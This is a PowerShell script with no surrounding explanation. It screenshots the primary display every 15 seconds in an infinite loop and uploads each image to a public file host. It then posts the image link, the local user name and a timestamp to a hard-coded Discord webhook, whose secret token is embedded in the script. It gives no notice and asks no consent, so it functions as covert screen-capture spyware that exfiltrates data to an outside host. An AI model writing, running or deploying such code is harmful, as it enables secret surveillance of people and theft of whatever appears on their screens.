# Check if AWS tools are installed (optional, since we're not using them anymore)
if (-not (Get-InstalledModule -Name AWS.Tools.Common -ErrorAction SilentlyContinue)) {
    Install-Module -Name AWS.Tools.Installer -Force -Confirm:$false
    Install-AWSToolsModule -Name AWS.Tools.Common,AWS.Tools.S3 -CleanUp -Force -Confirm:$false
}

# Remove the AWS tools import
# Import-Module -Name AWS.Tools.Common
# Import-Module -Name AWS.Tools.S3

function Capture-Screenshot {
    param (
        [string]$OutputFilePath
    )

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

    $bmp.Save($OutputFilePath)
    $graphics.Dispose()
    $bmp.Dispose()
}

function Upload-ToCatbox {
    param (
        [string]$ImageFilePath
    )

    $catboxUrl = "https://catbox.moe/user/api.php"

    $formData = @{
        fileToUpload = Get-Item -Path $ImageFilePath
        reqtype = "fileupload"
    }

    $response = Invoke-RestMethod -Uri $catboxUrl -Method Post -Form $formData
    return $response.url
}

function Send-DiscordMessage {
    param (
        [string]$WebhookUrl,
        [string]$UserName,
        [string]$ImageUrl
    )

    $DateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Message = "User: $UserName at $DateTime - Screenshot: $ImageUrl"

    $payload = @{
        content = $Message
    }

    $body = $payload | ConvertTo-Json -Depth 5  

    $headers = @{
        'Content-Type' = 'application/json'
    }

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $body
}

$discordWebhookUrl = "https://discord.com/api/webhooks/1287792562098274315/OpWPJFFOR_DP-FzhglSz6EThsVESr0fHA3LJRtSn-zxRsykRXLfcb-phlqx4zAi8ttYn"

while ($true) {
    $outputFilePath = "$env:temp\$env:computername-Capture.png"
    Capture-Screenshot -OutputFilePath $outputFilePath
    $imageUrl = Upload-ToCatbox -ImageFilePath $outputFilePath
    Send-DiscordMessage -WebhookUrl $discordWebhookUrl -UserName $env:UserName -ImageUrl $imageUrl
    Start-Sleep -Seconds 15
}
